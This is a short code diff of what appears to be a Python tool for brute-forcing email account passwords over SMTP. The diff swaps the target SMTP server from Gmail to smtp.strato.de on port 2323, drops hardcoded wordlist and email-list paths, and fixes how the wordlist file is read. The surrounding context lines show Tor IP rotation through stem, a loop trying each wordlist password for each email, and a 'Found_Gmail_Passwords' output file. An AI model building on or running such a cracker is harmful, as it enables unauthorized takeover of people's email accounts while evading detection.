@@ -1,7 +1,5 @@
-wordlist="/home/cyber/rockyou.txt"
-smtp="smtp.gmail.com"
-port="587"
-emails="/home/cyber/emails"
+smtp="smtp.strato.de"
+port="2323"
 import requests
 from stem.control import Controller
 from stem import Signal
@@ -60,7 +58,7 @@ found = "~/Found_Gmail_Passwords"
 
 def cracker(emails, wordlist, smtp, port):
     global smtpserver
-    wordlist = [x.strip('\n') for x in open("wordlist.py", "r", errors="ignore").readlines()]
+    wordlist = [x.strip('\n') for x in open(wordlist, "r", errors="ignore").readlines()]
     for mail in emails:
         print(f"{y}Fetching mail {r}{str(m)}")
         for n, password in enumerate(wordlist):
